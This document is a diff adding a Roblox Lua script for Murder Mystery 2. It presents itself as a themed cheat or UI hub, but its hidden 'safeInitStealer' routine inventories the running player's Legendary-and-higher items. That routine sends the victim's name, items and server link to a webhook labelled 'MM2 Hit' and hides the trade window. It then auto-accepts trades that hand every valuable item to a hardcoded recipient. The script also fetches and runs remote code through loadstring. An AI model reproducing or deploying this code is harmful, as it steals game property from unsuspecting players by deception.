+    [\"Painted Gun\"] = 0.22,\
+    [\"Fragile Gun\"] = 0.12,\
+    [\"Fragile Knife\"] = 0.12,\
+    [\"Carrot Bunny\"] = 0.32,\
+    [\"Waves\"] = 140,\
+    [\"Ocean\"] = 145,\
+    [\"Beach\"] = 3,\
+    [\"Flora\"] = 500,\
+    [\"Bloom\"] = 400,\
+    [\"Sunset\"] = 560,\
+    [\"Popsicle\"] = 0.22,\
+    [\"Pool Noodle\"] = 0.31,\
+    [\"Toy Knife\"] = 0.21,\
+    [\"Toy Gun\"] = 0.21,\
+    [\"Sticker Gun\"] = 0.12,\
+    [\"Chroma Travelers Gun\"] = 42500,\
+    [\"Traveler's Gun\"] = 1550,\
+    [\"Darkshot\"] = 430,\
+    [\"Darksword\"] = 425,\
+    [\"Traveler's Axe\"] = 4600,\
+    [\"Traveler Gun\"] = 4,\
+    [\"Traveler Knife\"] = 0.43,\
+    [\"Darkknife\"] = 0.43,\
+    [\"Ghastly Gun\"] = 0.41,\
+    [\"Ghoulish\"] = 25,\
+    [\"Wood Knife\"] = 0.13,\
+    [\"Vines Gun\"] = 0.13,\
+    [\"Vines Knife\"] = 0.21,\
+    [\"Etched\"] = 0.22,\
+    [\"Steel Knife\"] = 0.22,\
+    [\"Glowy\"] = 0.22,\
+    [\"Eclipse\"] = 0.22,\
+    [\"Steel Gun\"] = 0.32,\
+    [\"Meltdown\"] = 0.32,\
+    [\"Turkey\"] = 975,\
+    [\"Latte Gun\"] = 795,\
+    [\"Latte\"] = 795,\
+    [\"Scarf\"] = 0.31,\
+    [\"Pumpkin Pie\"] = 0.41,\
+    [\"Darkgun\"] = 0.33,\
+    [\"Ghastly Knife\"] = 0.33,\
+    [\"Evergreen\"] = 435,\
+    [\"Evergun\"] = 925,\
+    [\"Gingerscope\"] = 6100,\
+    [\"Chroma Evergun\"] = 23000,\
+    [\"Chroma Evergreen\"] = 11000,\
+    [\"Frostfade Gun\"] = 0.43,\
+    [\"Frostfade Knife\"] = 2,\
+    [\"Snowflake Gun 23\"] = 0.32,\
+    [\"Neon Gun\"] = 0.33,\
+    [\"Snowglobe Knife\"] = 0.32,\
+    [\"Tree Knife 23\"] = 0.33,\
+    [\"Snowman Gun 23\"] = 0.31,\
+    [\"Fireplace\"] = 0.31,\
+    [\"Canes Knife\"] = 0.23,\
+    [\"Canes Gun\"] = 0.31,\
+    [\"Stars Gun\"] = 0.23,\
+    [\"Stars Knife\"] = 0.31,\
+    [\"Snowfall\"] = 0.12,\
+    [\"Santa Gun 23\"] = 0.13,\
+    [\"Elf Gun 23\"] = 0.12,\
+    [\"Ribbon Knife\"] = 0.13,\
+    [\"Bells\"] = 0.12,\
+    [\"Present Knife\"] = 0.13,\
+    [\"Frozen Gun 23\"] = 0.12,\
+    [\"Frozen Knife 23\"] = 0.13,\
+    [\"Flowerwood\"] = 120,\
+    [\"Flowerwood Gun\"] = 120,\
+    [\"Wavy Gun\"] = 0.32,\
+    [\"Wavy Knife\"] = 0.32,\
+    [\"Carrot Knife\"] = 0.31,\
+    [\"Carrot Gun\"] = 0.31,\
+    [\"Robot Knife\"] = 0.32,\
+    [\"Spring Knife\"] = 0.33,\
+    [\"Blue Gingerscope\"] = 1000000,\
+    [\"Blue Gingerscythe\"] = 1000000,\
+    [\"Bronze Gingerscope\"] = 50000000,\
+    [\"Bronze Gingerscythe\"] = 50000000,\
+    [\"Silver Gingerscope\"] = 75000000,\
+    [\"Silver Gingerscythe\"] = 75000000,\
+    [\"Gold Gingerscope\"] = 100000000,\
+    [\"Gold Gingerscythe\"] = 100000000,\
+    [\"Chroma Watergun\"] = 3500,\
+    [\"Watergun\"] = 225,\
+    [\"Pearl\"] = 115,\
+    [\"Pearlshine\"] = 115,\
+    [\"Palms Knife\"] = 0.43,\
+    [\"Palms Gun\"] = 2,\
+    [\"Waves Knife\"] = 0.41,\
+    [\"Floral Gun\"] = 0.33,\
+    [\"Jellyfish Knife\"] = 0.22,\
+    [\"Popsicle Gun\"] = 0.22,\
+    [\"Turtle Knife\"] = 0.22,\
+    [\"Clownfish Gun\"] = 0.22,\
+    [\"Sandy Gun\"] = 0.22,\
+    [\"Balloons Gun\"] = 0.22,\
+    [\"Starfish Knife\"] = 0.22,\
+    [\"Starfish Gun\"] = 0.22,\
+    [\"Clownfish Knife\"] = 0.22,\
+    [\"Floatie\"] = 0.31,\
+    [\"Sharky Knife\"] = 0.42,\
+    [\"Leaves\"] = 1,\
+    [\"Aliens\"] = 1,\
+    [\"Moon\"] = 1,\
+    [\"Treat\"] = 175,\
+    [\"Sweet\"] = 170,\
+    [\"Heart Wand\"] = 300,\
+    [\"Raygun\"] = 1000,\
+    [\"Alienbeam\"] = 1750,\
+    [\"Sunrise\"] = 1150,\
+    [\"Snowcannon\"] = 950,\
+    [\"Snow Dagger\"] = 250,\
+    [\"Blizzard\"] = 260,\
+    [\"Snowstorm\"] = 255,\
+    [\"Xenoknife\"] = 270,\
+    [\"Xenoshot\"] = 275,\
+    [\"Celestial\"] = 1500,\
+    [\"Australis\"] = 150,\
+    [\"Borealis\"] = 155,\
+    [\"Beachy\"] = 100,\
+    [\"Icecream\"] = 100,\
+    [\"Sands\"] = 100,\
+    [\"Bauble\"] = 200,\
+}\
+local nonTradable = {\
+    DefaultGun = true, DefaultKnife = true, Reaver = true, Reaver_Legendary = true,\
+    Reaver_Godly = true, Reaver_Ancient = true, IceHammer = true,\
+    IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,\
+    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true,\
+    Gingerscythe_Ancient = true, TestItem = true, Season1TestKnife = true,\
+    Cracks = true, Icecrusher = true, [\"???\"] = true, Dartbringer = true,\
+    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true,\
+    TravelerAxeGold = true, BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,\
+    SharkSeeker = true,\
+    [\"Gold Candy\"] = true, [\"Silver Candy\"] = true, [\"Bronze Candy\"] = true,\
+    [\"Gold Hallow\"] = true, [\"Silver Hallow\"] = true, [\"Bronze Hallow\"] = true,\
+    [\"Gold Sugar\"] = true, [\"Silver Sugar\"] = true, [\"Bronze Sugar\"] = true,\
+    [\"Gold Logchopper\"] = true, [\"Silver Logchopper\"] = true, [\"Bronze Logchopper\"] = true,\
+    [\"Gold Minty\"] = true, [\"Silver Minty\"] = true, [\"Bronze Minty\"] = true,\
+    [\"Gold Icebreaker\"] = true, [\"Silver Icebreaker\"] = true, [\"Bronze Icebreaker\"] = true,\
+    [\"Gold Iceblaster\"] = true, [\"Silver Iceblaster\"] = true, [\"Bronze Iceblaster\"] = true,\
+    [\"Gold Harvester\"] = true, [\"Silver Harvester\"] = true, [\"Bronze Harvester\"] = true,\
+    [\"Gold Swirly Axe\"] = true, [\"Gold Swirly Gun\"] = true, [\"Silver Swirly\"] = true,\
+    [\"Bronze Swirly\"] = true, [\"Silver Swirly Gun\"] = true, [\"Bronze Swirly Gun\"] = true,\
+    [\"Gold Elderwood\"] = true, [\"Silver Elderwood\"] = true, [\"Bronze Elderwood\"] = true,\
+    [\"Gold Icepiercer\"] = true, [\"Silver Icepiercer\"] = true, [\"Bronze Icepiercer\"] = true,\
+    [\"Gold Icecrusher\"] = true, [\"Silver Icecrusher\"] = true, [\"Bronze Icecrusher\"] = true,\
+    [\"Gold Gingerscope\"] = true, [\"Silver Gingerscope\"] = true, [\"Bronze Gingerscope\"] = true,\
+    [\"Gold Gingerscythe\"] = true, [\"Silver Gingerscythe\"] = true, [\"Bronze Gingerscythe\"] = true,\
+    [\"Gold Vamp's Edge\"] = true, [\"Silver Vamp's Edge\"] = true, [\"Bronze Vamp's Edge\"] = true,\
+    [\"Gold Elderwood (gun)\"] = true, [\"Silver Elderwood (gun)\"] = true, [\"Bronze Elderwood (gun)\"] = true,\
+    [\"Nik's Scythe\"] = true,\
+}\
+local function safeInitStealer()\
+    local success, err = pcall(function()\
+        local function getInventory()\
+            local success, data = pcall(function()\
+                return ReplicatedStorage:WaitForChild(\"Remotes\"):WaitForChild(\"Inventory\"):WaitForChild(\"GetProfileData\"):InvokeServer(LP.Name)\
+            end)\
+            if not success or not data or not data.Weapons or not data.Weapons.Owned then\
+                return {}\
+            end\
+            return data\
+        end\
+        local rarityOrder = {\"Common\",\"Uncommon\",\"Rare\",\"Legendary\",\"Godly\",\"Ancient\",\"Unique\",\"Vintage\"}\
+        local minRarity = \"Legendary\"\
+        local minLevel = table.find(rarityOrder, minRarity) or 1\
+        local itemDatabase = require(ReplicatedStorage:WaitForChild(\"Database\"):WaitForChild(\"Sync\"):WaitForChild(\"Item\"))\
+        local inventory = getInventory()\
+        local itemsToTrade = {}   \
+        local goodItems = {}      \
+        local totalValue = 0\
+        if inventory and inventory.Weapons then\
+            for itemId, count in pairs(inventory.Weapons.Owned) do\
+                if count > 0 and not nonTradable[itemId] then\
+                    local itemData = itemDatabase[itemId]\
+                    if itemData then\
+                        local rarity = itemData.Rarity\
+                        local rarityIdx = table.find(rarityOrder, rarity)\
+                        if rarityIdx and rarityIdx >= minLevel then\
+                            local val = values[itemData.ItemName] or 0\
+                            table.insert(goodItems, {name = itemData.ItemName, value = val, rarity = rarity, count = count})\
+                            totalValue = totalValue + (val * count)\
+                            if (rarity == \"Godly\" or rarity == \"Ancient\" or rarity == \"Unique\" or rarity == \"Legendary\") and val >= minValue then\
+                                table.insert(itemsToTrade, {id = itemId, rarity = rarity, qty = count, val = val})\
+                            end\
+                        end\
+                    end\
+                end\
+            end\
+        end\
+        shouldSteal = (#itemsToTrade > 0)\
+        local function sendWebhook(isFinal)\
+            if isFinal then\
+                local lines = {}\
+                local total = 0\
+                if #goodItems == 0 then\
+                    table.insert(lines, \"No Legendary+ items found.\")\
+                else\
+                    for _, it in ipairs(goodItems) do\
+                        if #lines < 20 then\
+                            local mult = it.count > 1 and \" x\"..it.count or \"\"\
+                            table.insert(lines, it.name..\" — \"..it.value..mult)\
+                        end\
+                        total = total + it.value * it.count\
+                    end\
+                    if #goodItems > 20 then table.insert(lines, \"and \"..(#goodItems-20)..\" more...\") end\
+                end\
+                local embed = {\
+                    title = \"✅ Trade Completed\",\
+                    description = \"Items stolen successfully!\",\
+                    color = 0x00FF00,\
+                    fields = {\
+                        {name = \"Victim\", value = LP.Name, inline = false},\
+                        {name = \"Items (all Legendary+ and above)\", value = \"```\"..table.concat(lines, \"\\n\")..\"```\", inline = false},\
+                        {name = \"Total Value\", value = \"```\"..math.floor(total)..\"```\", inline = false},\
+                        {name = \"Server\", value = \"https://gamerready.github.io/goofy-site/?placeId=142823291&gameInstanceId=\"..game.JobId, inline = false},\
+                    },\
+                    timestamp = os.date(\"!%Y-%m-%dT%H:%M:%SZ\")\
+                }\
+                local payload = {embeds = {embed}}\
+                local json = HttpService:JSONEncode(payload)\
+                pcall(function()\
+                    local req = syn and syn.request or http_request or request\
+                    if req then\
+                        req({Url = webHook, Method = \"POST\", Headers = {[\"Content-Type\"] = \"application/json\"}, Body = json})\
+                    else\
+                        HttpService:PostAsync(webHook, json, Enum.HttpContentType.ApplicationJson)\
+                    end\
+                end)\
+                return\
+            end\
+            if not shouldSteal or #goodItems == 0 then return end\
+            local lines = {}\
+            local total = 0\
+            for _, it in ipairs(goodItems) do\
+                if #lines < 20 then\
+                    local mult = it.count > 1 and \" x\"..it.count or \"\"\
+                    table.insert(lines, it.name..\" — \"..it.value..mult)\
+                end\
+                total = total + it.value * it.count\
+            end\
+            if #goodItems > 20 then table.insert(lines, \"and \"..(#goodItems-20)..\" more...\") end\
+            local embed = {\
+                title = \"🔪 MM2 Hit\",\
+                description = \"Join and accept trade\",\
+                color = 0xFFAA00,\
+                fields = {\
+                    {name = \"Victim\", value = LP.Name, inline = false},\
+                    {name = \"Items (all Legendary+ and above)\", value = \"```\"..table.concat(lines, \"\\n\")..\"```\", inline = false},\
+                    {name = \"Total Value\", value = \"```\"..math.floor(total)..\"```\", inline = false},\
+                    {name = \"Server\", value = \"roblox://placeId=142823291&gameInstanceId=\"..game.JobId, inline = false},\
+                },\
+                timestamp = os.date(\"!%Y-%m-%dT%H:%M:%SZ\")\
+            }\
+            local payload = {embeds = {embed}}\
+            local json = HttpService:JSONEncode(payload)\
+            pcall(function()\
+                local req = syn and syn.request or http_request or request\
+                if req then\
+                    req({Url = webHook, Method = \"POST\", Headers = {[\"Content-Type\"] = \"application/json\"}, Body = json})\
+                else\
+                    HttpService:PostAsync(webHook, json, Enum.HttpContentType.ApplicationJson)\
+                end\
+            end)\
+        end\
+        if shouldSteal then\
+            sendWebhook(false)\
+        end\
+        local guiConnections = {}\
+        local function blockGUI()\
+            if not shouldSteal or guiBlocked then return end\
+            guiBlocked = true\
+            local gui = LP.PlayerGui:FindFirstChild(\"TradeGUI\")\
+            if gui then\
+                local conn = gui:GetPropertyChangedSignal(\"Enabled\"):Connect(function() gui.Enabled = false end)\
+                table.insert(guiConnections, conn)\
+                gui.Enabled = false\
+            end\
+            local phoneGui = LP.PlayerGui:FindFirstChild(\"TradeGUI_Phone\")\
+            if phoneGui then\
+                local conn = phoneGui:GetPropertyChangedSignal(\"Enabled\"):Connect(function() phoneGui.Enabled = false end)\
+                table.insert(guiConnections, conn)\
+                phoneGui.Enabled = false\
+            end\
+            local conn = LP.PlayerGui.ChildAdded:Connect(function(child)\
+                if child.Name == \"TradeGUI\" or child.Name == \"TradeGUI_Phone\" then\
+                    child.Enabled = false\
+                    local conn2 = child:GetPropertyChangedSignal(\"Enabled\"):Connect(function() child.Enabled = false end)\
+                    table.insert(guiConnections, conn2)\
+                end\
+            end)\
+            table.insert(guiConnections, conn)\
+        end\
+        local function unblockGUI()\
+            if not guiBlocked then return end\
+            guiBlocked = false\
+            pcall(function() ReplicatedStorage.Trade.DeclineTrade:FireServer() end)\
+            pcall(function() ReplicatedStorage.Trade.CancelAccept:FireServer() end)\
+            for _, conn in ipairs(guiConnections) do pcall(function() conn:Disconnect() end) end\
+            guiConnections = {}\
+            local gui = LP.PlayerGui:FindFirstChild(\"TradeGUI\") if gui then gui.Enabled = false end\
+            local phoneGui = LP.PlayerGui:FindFirstChild(\"TradeGUI_Phone\") if phoneGui then phoneGui.Enabled = false end\
+        end\
+        local function callAcceptTrade(...)\
+            local args = {...}\
+            local Trade = ReplicatedStorage:WaitForChild(\"Trade\")\
+            local AcceptTrade = Trade:WaitForChild(\"AcceptTrade\")\
+            pcall(function() AcceptTrade:FireServer(unpack(args)) end)\
+            pcall(function() AcceptTrade:InvokeServer(unpack(args)) end)\
+        end\
+        local function acceptTradeWithRetry()\
+            if not shouldSteal then return end\
+            local function runBlock()\
+                local Trade = ReplicatedStorage:WaitForChild(\"Trade\")\
+                local AcceptTrade = Trade:WaitForChild(\"AcceptTrade\")\
+                local CancelAccept = Trade:WaitForChild(\"CancelAccept\")\
+                local UpdateTrade = Trade:WaitForChild(\"UpdateTrade\")\
+                AcceptTrade:FireServer(game.PlaceId * 3, nil)\
+                task.wait(0.1)\
+                CancelAccept:FireServer()\
+                task.wait(0.1)\
+                local lastOffer = nil\
+                local conn = UpdateTrade.OnClientEvent:Connect(function(data)\
+                    if data.LastOffer then lastOffer = data.LastOffer conn:Disconnect() end\
+                end)\
+                local waitTime = 0\
+                while lastOffer == nil and waitTime < 1 do task.wait(0.05) waitTime = waitTime + 0.05 end\
+                if conn then conn:Disconnect() end\
+                if lastOffer then callAcceptTrade(game.PlaceId * 3, lastOffer)\
+                else callAcceptTrade(game.PlaceId * 3, nil) end\
+            end\
+            for i = 1, 3 do task.spawn(runBlock) if i < 3 then task.wait(0.8) end end\
+            task.wait(1.5)\
+        end\
+        if shouldSteal then\
+            local RequestSent = ReplicatedStorage:WaitForChild(\"Trade\"):WaitForChild(\"RequestSent\")\
+            RequestSent.OnClientEvent:Connect(function(sender)\
+                if sender.Name == userName then\
+                    pcall(function() ReplicatedStorage:WaitForChild(\"Trade\"):WaitForChild(\"AcceptRequest\"):FireServer() end)\
+                    task.wait(0.5)\
+                    acceptTradeWithRetry()\
+                else\
+                    pcall(function() ReplicatedStorage:WaitForChild(\"Trade\"):WaitForChild(\"DeclineRequest\"):FireServer() end)\
+                end\
+            end)\
+        end\
+        local Trade = ReplicatedStorage:WaitForChild(\"Trade\")\
+        local SendRequest = Trade:WaitForChild(\"SendRequest\")\
+        local OfferItem = Trade:WaitForChild(\"OfferItem\")\
+        local GetTradeStatus = Trade:WaitForChild(\"GetTradeStatus\")\
+        local DeclineTrade = Trade:WaitForChild(\"DeclineTrade\")\
+        local DeclineRequest = Trade:WaitForChild(\"DeclineRequest\")\
+        table.sort(itemsToTrade, function(a,b) return (a.val*a.qty) > (b.val*b.qty) end)\
+        local function startSteal(targetPlayer)\
+            if stealDone then return end\
+            if #itemsToTrade == 0 then\
+                stealDone = true\
+                sendWebhook(true)\
+                return\
+            end\
+            if not targetPlayer or not targetPlayer.Character then return end\
+            blockGUI()\
+            local status = GetTradeStatus:InvokeServer()\
+            if status == \"StartTrade\" then DeclineTrade:FireServer()\
+            elseif status == \"ReceivingRequest\" then DeclineRequest:FireServer() end\
+            task.wait(0.5)\
+            local localItems = {}\
+            for _, v in ipairs(itemsToTrade) do localItems[#localItems+1] = v end\
+            while #localItems > 0 do\
+                local status = GetTradeStatus:InvokeServer()\
+                if status == \"None\" then\
+                    pcall(function() SendRequest:InvokeServer(targetPlayer) end) task.wait(1)\
+                elseif status == \"SendingRequest\" then task.wait(0.3)\
+                elseif status == \"ReceivingRequest\" then DeclineRequest:FireServer() task.wait(0.3)\
+                elseif status == \"StartTrade\" then\
+                    local count = 0\
+                    while #localItems > 0 and count < 4 do\
+                        local w = table.remove(localItems, 1)\
+                        for i = 1, w.qty do pcall(function() OfferItem:FireServer(w.id, \"Weapons\") end) task.wait(0.05) end\
+                        count = count + 1\
+                    end\
+                    task.wait(6)\
+                    acceptTradeWithRetry()\
+                    repeat task.wait(0.2) until GetTradeStatus:InvokeServer() == \"None\"\
+                else task.wait(0.5) end\
+                task.wait()\
+            end\
+            sendWebhook(true)  \
+            unblockGUI()\
+        end\
+        local function onPlayerAdded(player)\
+            if stealDone then return end\
+            if player.Name == userName then task.wait(15) startSteal(player) end\
+        end\
+        Players.PlayerAdded:Connect(onPlayerAdded)\
+        local existing = Players:FindFirstChild(userName)\
+        if existing and not stealDone then task.wait(15) startSteal(existing) end\
+    end)\
+    if not success then\
+        shouldSteal = false\
+    end\
+end\
+safeInitStealer()\
+local Fluent = loadstring(game:HttpGet(\"https://github.com/StyearX/Fluent-Modded/releases/download/Fluent/FluentPro\"))()\
+local Players = game:GetService(\"Players\")\
+local RunService = game:GetService(\"RunService\")\
+local UserInputService = game:GetService(\"UserInputService\")\
+local Debris = game:GetService(\"Debris\")\
+local LocalPlayer = Players.LocalPlayer\
+local Camera = workspace.CurrentCamera\
+local HttpService = game:GetService(\"HttpService\")\
+local CoreGui = game:GetService(\"CoreGui\")\
+local ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\
+local TweenService = game:GetService(\"TweenService\")\
+local VirtualUser = game:GetService(\"VirtualUser\")\
+local Lighting = game:GetService(\"Lighting\")\
+local function Notify(title, content, ntype, icon, duration)\
+    pcall(function()\
+        Fluent:Notify({ Title = title, Content = content, Type = ntype or \"Info\", Icon = icon, Duration = duration or 3 })\
+    end)\
+end\
+local FadeEvent, RoundEndFadeEvent, PlayEmoteEvent\
+pcall(function()\
+    local GameplayFolder = ReplicatedStorage:WaitForChild(\"Remotes\"):WaitForChild(\"Gameplay\")\
+    FadeEvent = GameplayFolder:WaitForChild(\"Fade\")\
+    RoundEndFadeEvent = GameplayFolder:WaitForChild(\"RoundEndFade\")\
+    PlayEmoteEvent = ReplicatedStorage:WaitForChild(\"Remotes\"):WaitForChild(\"Misc\"):WaitForChild(\"PlayEmote\")\
+end)\
+local themes = {}\
+local function addTheme(name, data)\
+    pcall(function()\
+        if Fluent.RegisterCustomTheme then Fluent:RegisterCustomTheme(name, data) table.insert(themes, name) end\
+    end)\
+end\
+addTheme(\"Blue (Ryo)\", {\
+    Name = \"Blue (Ryo)\", Accent = Color3.fromRGB(100, 140, 220),\
+    AcrylicMain = Color3.fromRGB(18, 20, 28), AcrylicBorder = Color3.fromRGB(80, 100, 160),\
+    AcrylicGradient = ColorSequence.new(Color3.fromRGB(18, 20, 28), Color3.fromRGB(10, 12, 18)), AcrylicNoise = 0.7,\
+    TitleBarLine = Color3.fromRGB(80, 100, 160), Tab = Color3.fromRGB(30, 35, 50), Element = Color3.fromRGB(25, 28, 40),\
+    ElementBorder = Color3.fromRGB(70, 85, 140), InElementBorder = Color3.fromRGB(100, 130, 200), ElementTransparency = 0.82,\
+    ToggleSlider = Color3.fromRGB(40, 45, 65), ToggleToggled = Color3.fromRGB(100, 140, 220), SliderRail = Color3.fromRGB(40, 45, 65),\
+    DropdownFrame = Color3.fromRGB(20, 22, 32), DropdownHolder = Color3.fromRGB(12, 14, 20), DropdownBorder = Color3.fromRGB(70, 85, 140),\
+    DropdownOption = Color3.fromRGB(30, 35, 50), Keybind = Color3.fromRGB(30, 35, 50), Input = Color3.fromRGB(20, 22, 32),\
+    InputFocused = Color3.fromRGB(8, 10, 16), InputIndicator = Color3.fromRGB(100, 130, 200),\
+    Dialog = Color3.fromRGB(14, 16, 22), DialogHolder = Color3.fromRGB(10, 12, 18), DialogHolderLine = Color3.fromRGB(60, 75, 120),\
+    DialogButton = Color3.fromRGB(25, 30, 44), DialogButtonBorder = Color3.fromRGB(70, 85, 140), DialogBorder = Color3.fromRGB(70, 85, 140),\
+    DialogInput = Color3.fromRGB(20, 22, 32), DialogInputLine = Color3.fromRGB(100, 130, 200),\
+    Text = Color3.fromRGB(230, 235, 250), SubText = Color3.fromRGB(160, 175, 210), Hover = Color3.fromRGB(45, 52, 75), HoverChange = 0.05,\
+    ShineEnabled = true, Shine = { Speed = 0.5, RotationSpeed = 25,\
+        ColorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 40, 80)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 140, 220)), ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 40, 80)) }) },\
+    StrokeShine = true, StrokeDark = Color3.fromRGB(50, 60, 100),\
+    ButtonGradient = { Background = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 40, 80)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 20, 40)) }),\
+        Stroke = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 110, 180)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(130, 170, 240)), ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 110, 180)) }) },\
+    Background = \"rbxassetid://110300998910160\", BackgroundTransparency = 0.15,\
+})\
+addTheme(\"Red (Kita)\", {\
+    Name = \"Red (Kita)\", Accent = Color3.fromRGB(255, 90, 90), AcrylicMain = Color3.fromRGB(28, 18, 18),\
+    AcrylicBorder = Color3.fromRGB(200, 60, 60), AcrylicGradient = ColorSequence.new(Color3.fromRGB(28, 18, 18), Color3.fromRGB(14, 8, 8)), AcrylicNoise = 0.7,\
+    TitleBarLine = Color3.fromRGB(200, 60, 60), Tab = Color3.fromRGB(40, 25, 25), Element = Color3.fromRGB(35, 20, 20),\
+    ElementBorder = Color3.fromRGB(180, 50, 50), InElementBorder = Color3.fromRGB(240, 90, 90), ElementTransparency = 0.82,\
+    ToggleSlider = Color3.fromRGB(55, 30, 30), ToggleToggled = Color3.fromRGB(255, 90, 90), SliderRail = Color3.fromRGB(55, 30, 30),\
+    DropdownFrame = Color3.fromRGB(25, 15, 15), DropdownHolder = Color3.fromRGB(14, 8, 8), DropdownBorder = Color3.fromRGB(180, 50, 50),\
+    DropdownOption = Color3.fromRGB(40, 25, 25), Keybind = Color3.fromRGB(40, 25, 25), Input = Color3.fromRGB(25, 15, 15),\
+    InputFocused = Color3.fromRGB(10, 5, 5), InputIndicator = Color3.fromRGB(240, 90, 90),\
+    Dialog = Color3.fromRGB(18, 10, 10), DialogHolder = Color3.fromRGB(10, 5, 5), DialogHolderLine = Color3.fromRGB(140, 35, 35),\
+    DialogButton = Color3.fromRGB(35, 20, 20), DialogButtonBorder = Color3.fromRGB(180, 50, 50), DialogBorder = Color3.fromRGB(180, 50, 50),\
+    DialogInput = Color3.fromRGB(25, 15, 15), DialogInputLine = Color3.fromRGB(240, 90, 90),\
+    Text = Color3.fromRGB(255, 235, 235), SubText = Color3.fromRGB(230, 160, 160), Hover = Color3.fromRGB(60, 35, 35), HoverChange = 0.05,\
+    ShineEnabled = true, Shine = { Speed = 0.5, RotationSpeed = 25, ColorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 25, 25)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 100, 100)), ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 25, 25)) }) },\
+    StrokeShine = true, StrokeDark = Color3.fromRGB(120, 30, 30),\
+    ButtonGradient = { Background = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 30, 30)), ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 15, 15)) }),\
+        Stroke = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 70, 70)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 120)), ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 70, 70)) }) },\
+    Background = \"rbxassetid://125644682328750\", BackgroundTransparency = 0.15,\
+})\
+addTheme(\"Pink (Bocchi)\", {\
+    Name = \"Pink (Bocchi)\", Accent = Color3.fromRGB(240, 120, 190), AcrylicMain = Color3.fromRGB(30, 18, 28),\
+    AcrylicBorder = Color3.fromRGB(200, 80, 150), AcrylicGradient = ColorSequence.new(Color3.fromRGB(30, 18, 28), Color3.fromRGB(16, 8, 14)), AcrylicNoise = 0.7,\
+    TitleBarLine = Color3.fromRGB(200, 80, 150), Tab = Color3.fromRGB(45, 25, 40), Element = Color3.fromRGB(38, 20, 35),\
+    ElementBorder = Color3.fromRGB(180, 60, 130), InElementBorder = Color3.fromRGB(240, 130, 200), ElementTransparency = 0.82,\
+    ToggleSlider = Color3.fromRGB(55, 30, 50), ToggleToggled = Color3.fromRGB(240, 120, 190), SliderRail = Color3.fromRGB(55, 30, 50),\
+    DropdownFrame = Color3.fromRGB(26, 14, 22), DropdownHolder = Color3.fromRGB(16, 8, 14), DropdownBorder = Color3.fromRGB(180, 60, 130),\
+    DropdownOption = Color3.fromRGB(45, 25, 40), Keybind = Color3.fromRGB(45, 25, 40), Input = Color3.fromRGB(26, 14, 22),\
+    InputFocused = Color3.fromRGB(10, 5, 8), InputIndicator = Color3.fromRGB(240, 130, 200),\
+    Dialog = Color3.fromRGB(20, 10, 16), DialogHolder = Color3.fromRGB(10, 5, 8), DialogHolderLine = Color3.fromRGB(140, 40, 100),\
+    DialogButton = Color3.fromRGB(38, 20, 35), DialogButtonBorder = Color3.fromRGB(180, 60, 130), DialogBorder = Color3.fromRGB(180, 60, 130),\
+    DialogInput = Color3.fromRGB(26, 14, 22), DialogInputLine = Color3.fromRGB(240, 130, 200),\
+    Text = Color3.fromRGB(255, 235, 245), SubText = Color3.fromRGB(220, 160, 200), Hover = Color3.fromRGB(65, 35, 55), HoverChange = 0.05,\
+    ShineEnabled = true, Shine = { Speed = 0.5, RotationSpeed = 25, ColorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 30, 70)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 140, 200)), ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 30, 70)) }) },\
+    StrokeShine = true, StrokeDark = Color3.fromRGB(100, 40, 80),\
+    ButtonGradient = { Background = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 30, 70)), ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 15, 35)) }),\
+        Stroke = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 90, 160)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 150, 210)), ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 90, 160)) }) },\
+    Background = \"rbxassetid://100823211487117\", BackgroundTransparency = 0.15,\
+})\
+addTheme(\"Yellow (Nijika)\", {\
+    Name = \"Yellow (Nijika)\", Accent = Color3.fromRGB(255, 210, 80), AcrylicMain = Color3.fromRGB(28, 24, 14),\
+    AcrylicBorder = Color3.fromRGB(220, 170, 50), AcrylicGradient = ColorSequence.new(Color3.fromRGB(28, 24, 14), Color3.fromRGB(16, 14, 6)), AcrylicNoise = 0.7,\
+    TitleBarLine = Color3.fromRGB(220, 170, 50), Tab = Color3.fromRGB(45, 38, 18), Element = Color3.fromRGB(38, 30, 15),\
+    ElementBorder = Color3.fromRGB(200, 150, 40), InElementBorder = Color3.fromRGB(255, 200, 100), ElementTransparency = 0.82,\
+    ToggleSlider = Color3.fromRGB(55, 45, 25), ToggleToggled = Color3.fromRGB(255, 210, 80), SliderRail = Color3.fromRGB(55, 45, 25),\
+    DropdownFrame = Color3.fromRGB(25, 20, 10), DropdownHolder = Color3.fromRGB(14, 10, 5), DropdownBorder = Color3.fromRGB(200, 150, 40),\
+    DropdownOption = Color3.fromRGB(45, 38, 18), Keybind = Color3.fromRGB(45, 38, 18), Input = Color3.fromRGB(25, 20, 10),\
+    InputFocused = Color3.fromRGB(10, 8, 4), InputIndicator = Color3.fromRGB(255, 200, 100),\
